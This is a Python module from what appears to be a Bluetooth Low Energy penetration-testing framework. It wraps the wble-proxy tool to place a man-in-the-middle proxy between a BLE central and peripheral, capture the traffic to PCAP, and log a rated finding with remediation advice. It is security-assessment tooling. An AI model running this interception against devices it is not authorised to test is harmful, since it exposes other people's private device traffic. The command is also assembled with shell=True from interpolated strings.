"""
Stage 6 — MITM Proxy

Positions a transparent BLE proxy between a central and peripheral using
wble-proxy.  Two RF interfaces are required: the attack dongle (-i) and a
proxy/relay interface (-p, typically the host's built-in HCI adapter).

Prerequisite checks (all must pass before the active gate runs):
  1. wble-proxy binary in PATH
  2. target.connectable is True
  3. proxy interface accessible (hci0 or second WHAD dongle)

Mirrors Stage 5's dongle lifecycle: close WhadDevice before CLI, reopen after.
"""

from __future__ import annotations

import re
import shutil
import subprocess

from whad.device import WhadDevice

from core.dongle import WhadDongle
from core.models import Target, Finding
from core.db import insert_finding
from core.logger import get_logger
from core.pcap import pcap_path
import config

log = get_logger("s6_proxy")

PROXY_TIMEOUT = 300   # seconds the proxy runs before auto-stop


def run(dongle: WhadDongle, target: Target, engagement_id: str) -> None:
    """Run the MITM proxy stage against a single target.

    Args:
        dongle: Active WhadDongle (closed for CLI, reopened in finally).
        target: Connectable target to proxy.
        engagement_id: Engagement ID for PCAP naming and Finding storage.
    """
    if not _prereqs_ok(target):
        return

    addr = target.bd_address
    rand_flag = "-r" if target.address_type != "public" else ""
    _pcap = pcap_path(engagement_id, 6, addr)
    live_wireshark = _ask_wireshark()

    wireshark_flag = "-w" if live_wireshark else ""
    cmd = (
        f"wble-proxy"
        f" -i {config.INTERFACE}"
        f" -p {config.PROXY_INTERFACE}"
        f" {rand_flag}"
        f" {wireshark_flag}"
        f" -o {_pcap}"
        f" {addr}"
    )

    log.info(f"[S6] Starting MITM proxy against {addr}")
    log.info(f"[S6] Attack interface : {config.INTERFACE}")
    log.info(f"[S6] Proxy interface  : {config.PROXY_INTERFACE}")
    log.info(f"[S6] PCAP output      : {_pcap}")
    if live_wireshark:
        log.info("[S6] Wireshark will launch automatically (-w)")
    log.debug(f"[S6] Command: {cmd}")

    dongle.device.close()
    import time as _time
    _time.sleep(0.5)

    stdout = ""
    stderr = ""
    returncode = -1

    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=PROXY_TIMEOUT,
        )
        stdout = result.stdout
        stderr = result.stderr
        returncode = result.returncode
    except subprocess.TimeoutExpired:
        log.info(f"[S6] Proxy session ended after {PROXY_TIMEOUT}s timeout.")
    except Exception as exc:
        log.error(f"[S6] Subprocess error: {type(exc).__name__}: {exc}")
    finally:
        _reopen_dongle(dongle)

    if stderr.strip():
        log.debug(f"[S6] wble-proxy stderr: {stderr.strip()[:240]}")

    data_intercepted, connections_accepted = _parse_proxy_output(stdout)

    log.info(
        f"[S6] Proxy complete: "
        f"connections_accepted={connections_accepted}  "
        f"data_intercepted={data_intercepted}  "
        f"exit={returncode}"
    )

    _record_finding(
        target=target,
        engagement_id=engagement_id,
        pcap_path_str=str(_pcap),
        data_intercepted=data_intercepted,
        connections_accepted=connections_accepted,
    )
    _print_summary(target, data_intercepted, connections_accepted, str(_pcap))


def _ask_wireshark() -> bool:
    """Prompt operator to launch Wireshark live during the proxy session.

    Returns True if operator wants live Wireshark (-w flag), False otherwise.
    """
    if not shutil.which("wireshark"):
        return False
    try:
        raw = input(
            "\n  Launch Wireshark live during proxy session? [y/N]: "
        ).strip().lower()
    except (EOFError, KeyboardInterrupt):
        return False
    return raw in ("y", "yes")


def _prereqs_ok(target: Target) -> bool:
    """Check all prerequisites. Logs a descriptive error and returns False on failure."""
    if not shutil.which("wble-proxy"):
        log.error(
            "[S6] wble-proxy not found in PATH. "
            "Install WHAD tools: pip install whad"
        )
        return False

    if not target.connectable:
        log.error(
            f"[S6] Target {target.bd_address} is not connectable — "
            "MITM proxy requires a connectable peripheral."
        )
        return False

    return _select_proxy_interface()


def _select_proxy_interface() -> bool:
    """Discover available proxy interfaces and prompt operator to select one.

    Queries whadup for WHAD-native devices and hciconfig for HCI adapters.
    Excludes the attack interface already in use (config.INTERFACE).
    Auto-selects if exactly one candidate; prompts when multiple are available.
    Updates config.PROXY_INTERFACE to the chosen interface.

    Returns True when a valid interface is confirmed, False to skip Stage 6.
    """
    candidates = _discover_interfaces()
    candidates = [(n, d) for n, d in candidates if n != config.INTERFACE]

    if not candidates:
        log.error(
            "[S6] No proxy interface available. "
            f"Attack interface ({config.INTERFACE}) is already in use. "
            "Connect a second BLE adapter (built-in Bluetooth or a second dongle). "
            "List connected WHAD devices with: whadup"
        )
        return False

    current = config.PROXY_INTERFACE

    if len(candidates) == 1:
        name, display = candidates[0]
        if name != current:
            log.info(f"[S6] Auto-selected proxy interface: {display}")
            config.PROXY_INTERFACE = name
        else:
            log.info(f"[S6] Proxy interface confirmed: {display}")
        return True

    # Multiple candidates — prompt operator to choose
    print("\n  Stage 6 — Select proxy interface (second RF adapter):")
    print(f"  (Attack interface in use: {config.INTERFACE})\n")
    for i, (name, display) in enumerate(candidates, 1):
        marker = "  <-- current default" if name == current else ""
        print(f"  [{i}] {display}{marker}")
    print("  [s] Skip Stage 6\n")

    while True:
        try:
            raw = input("  Select [1-N/s]: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            return False
        if raw == "s":
            log.info("[S6] Stage 6 skipped by operator (no interface selected).")
            return False
        try:
            idx = int(raw) - 1
            if 0 <= idx < len(candidates):
                config.PROXY_INTERFACE = candidates[idx][0]
                log.info(f"[S6] Proxy interface set to: {config.PROXY_INTERFACE}")
                return True
        except ValueError:
            pass
        print(f"  Please enter 1-{len(candidates)} or 's' to skip.")


def _discover_interfaces() -> list[tuple[str, str]]:
    """Return list of (whad_name, display_label) for BLE interfaces on this system.

    Queries whadup for WHAD-native devices first (uart*, hci*), then falls back
    to hciconfig to catch built-in Bluetooth adapters not registered with WHAD.
    """
    found: list[tuple[str, str]] = []
    seen: set[str] = set()

    # WHAD-native interfaces via whadup (authoritative WHAD device list)
    try:
        result = subprocess.run(
            ["whadup"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("uart") or line.startswith("hci"):
                parts = line.split()
                if parts:
                    name = parts[0]
                    label = "  ".join(parts)   # e.g. "uart0  UartDevice  /dev/ttyACM0"
                    if name not in seen:
                        found.append((name, label))
                        seen.add(name)
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    # HCI adapters via hciconfig — catches built-in Bluetooth not listed by whadup
    try:
        result = subprocess.run(
            ["hciconfig"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        if result.returncode == 0:
            for line in result.stdout.splitlines():
                m = re.match(r"^(hci\d+)\s*:", line)
                if m:
                    name = m.group(1)
                    if name not in seen:
                        found.append((name, name))
                        seen.add(name)
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    return found


def _reopen_dongle(dongle: WhadDongle) -> None:
    """Re-attach the underlying WhadDevice, polling every 0.5s up to 6s."""
    import time as _time
    deadline = _time.time() + 6.0
    attempt = 0
    last_exc: Exception | None = None
    while _time.time() < deadline:
        try:
            dongle.device = WhadDevice.create(config.INTERFACE)
            if attempt > 0:
                log.debug(f"[S6] Reopen succeeded after {attempt * 0.5:.1f}s")
            return
        except Exception as exc:
            last_exc = exc
            attempt += 1
            _time.sleep(0.5)
    log.warning(
        f"[S6] Could not reopen WHAD device after 6s "
        f"({type(last_exc).__name__}: {last_exc!r})"
    )


def _parse_proxy_output(stdout: str) -> tuple[bool, bool]:
    """Heuristically extract connection/data signals from wble-proxy stdout.

    Returns:
        (data_intercepted, connections_accepted)

    NOTE: wble-proxy output format is not fully documented. Adjust keywords
    after first live test by inspecting actual stdout with log.debug().
    """
    lo = stdout.lower()
    connections_accepted = any(
        kw in lo
        for kw in ("connection established", "connected", "accepted", "central connected")
    )
    data_intercepted = any(
        kw in lo
        for kw in ("intercepted", "forwarded", "bytes", "read request", "write request")
    )
    return data_intercepted, connections_accepted


def _record_finding(
    target: Target,
    engagement_id: str,
    pcap_path_str: str,
    data_intercepted: bool,
    connections_accepted: bool,
) -> None:
    severity = (
        "critical" if data_intercepted
        else "high" if connections_accepted
        else "medium"
    )

    finding = Finding(
        type="mitm_proxy",
        severity=severity,
        target_addr=target.bd_address,
        description=(
            f"MITM proxy positioned against {target.bd_address} "
            f"({target.name or 'unnamed'}, {target.device_class}). "
            f"Connections accepted: {connections_accepted}. "
            f"Application data intercepted: {data_intercepted}. "
            "Traffic captured to PCAP for offline analysis."
        ),
        remediation=(
            "Implement mutual authentication using LE Secure Connections "
            "with MITM protection (authenticated pairing). "
            "Verify peripheral identity via IRK or certificate. "
            "Encrypt application-layer data as defence-in-depth."
        ),
        evidence={
            "target_addr": target.bd_address,
            "target_name": target.name,
            "device_class": target.device_class,
            "attack_interface": config.INTERFACE,
            "proxy_interface": config.PROXY_INTERFACE,
            "data_intercepted": data_intercepted,
            "connections_accepted": connections_accepted,
        },
        pcap_path=pcap_path_str,
        engagement_id=engagement_id,
    )
    insert_finding(finding)
    log.info(
        f"FINDING [{severity}] mitm_proxy: {target.bd_address} — "
        f"connections_accepted={connections_accepted}  "
        f"data_intercepted={data_intercepted}"
    )


def _print_summary(
    target: Target,
    data_intercepted: bool,
    connections_accepted: bool,
    pcap_path_str: str,
) -> None:
    severity = (
        "critical" if data_intercepted
        else "high" if connections_accepted
        else "medium"
    )
    import os as _os
    pcap_display = pcap_path_str
    if len(pcap_display) > 52:
        pcap_display = "…" + pcap_path_str[-51:]

    print("\n" + "─" * 76)
    print("  STAGE 6 SUMMARY -- MITM Proxy")
    print("─" * 76)
    print(f"  {'Target':<18}: {target.bd_address}")
    print(f"  {'Name':<18}: {target.name or '(unnamed)'}")
    print(f"  {'Device class':<18}: {target.device_class}")
    print(f"  {'Attack interface':<18}: {config.INTERFACE}")
    print(f"  {'Proxy interface':<18}: {config.PROXY_INTERFACE}")
    print(f"  {'PCAP':<18}: {pcap_display}")
    print(f"  {'Conn accepted':<18}: {'yes' if connections_accepted else 'no'}")
    print(f"  {'Data intercepted':<18}: {'yes' if data_intercepted else 'no'}")
    print(f"  {'Severity':<18}: {severity.upper()}")
    print(f"\n  Analyze captured traffic:")
    print(f"    wireshark {pcap_path_str}")
    print(f"    tshark -r {pcap_path_str} -Y btle")
    print("─" * 76 + "\n")
